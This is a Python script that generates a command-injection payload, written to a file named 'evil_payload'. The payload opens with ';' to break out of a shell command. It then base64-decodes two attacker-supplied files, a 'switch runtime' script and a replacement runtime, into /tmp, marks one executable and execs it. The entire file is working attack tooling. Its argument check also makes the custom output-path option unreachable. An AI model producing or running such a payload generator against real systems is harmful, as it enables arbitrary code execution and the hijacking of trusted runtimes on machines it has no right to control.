#!/usr/bin/env python3

from sys import argv
from base64 import b64encode

USAGE = "[!] Usage: {} <switch-runtime-script-path> <new-runtime-path>"
DEFAULT_OUT_PATH = "evil_payload"

PAYLOAD_FORMAT = """; switch_runtime_b64="{}" ; new_runtime_b64="{}";""" + \
""" echo -n $new_runtime_b64 | base64 -d > /tmp/runtime; """ + \
""" echo -n $switch_runtime_b64 | base64 -d > /tmp/switch; chmod +x /tmp/switch; exec /tmp/switch; echo 'unexpected' """

def main():
	if len(argv) != 3:
		print(USAGE.format(argv[0]))
		return

	if len(argv) == 4:
		out_path = argv[3]
	else:
		out_path = DEFAULT_OUT_PATH

	switch_script = readfile(argv[1], "rb")
	new_runtime = readfile(argv[2], "rb")

	encoded_switch_script = b64_encode(switch_script)
	encoded_new_runtime = b64_encode(new_runtime)
	payload = PAYLOAD_FORMAT.format(encoded_switch_script, encoded_new_runtime)

	writefile(out_path, "w", payload)
	print("[+] Done, payload at {}".format(out_path))


def readfile(path, mode):
	with open(path, mode) as f:
		return f.read()

def writefile(path, mode, data):
	with open(path, mode) as f:
		f.write(data)

def b64_encode(data):
	if type(data) != bytes:
		data = bytes(data)

	encoded = b64encode(data)
	return str(encoded, "utf8")


if __name__ == "__main__":
	main()